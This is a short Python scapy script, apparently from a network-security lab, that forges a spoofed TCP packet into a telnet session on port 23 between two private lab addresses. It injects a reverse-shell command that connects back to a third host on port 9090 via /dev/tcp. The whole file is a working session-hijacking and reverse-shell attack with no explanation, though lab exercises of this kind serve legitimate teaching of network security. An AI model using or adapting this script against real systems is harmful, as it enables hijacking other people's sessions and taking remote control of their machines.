#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.6", dst="10.0.2.15")
tcp = TCP(sport=57807, dport=23, flags="A", seq=2929719496, ack=2464192781)
data = "\n/bin/bash -i > /dev/tcp/10.0.2.5/9090 0<&1 2>&1\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
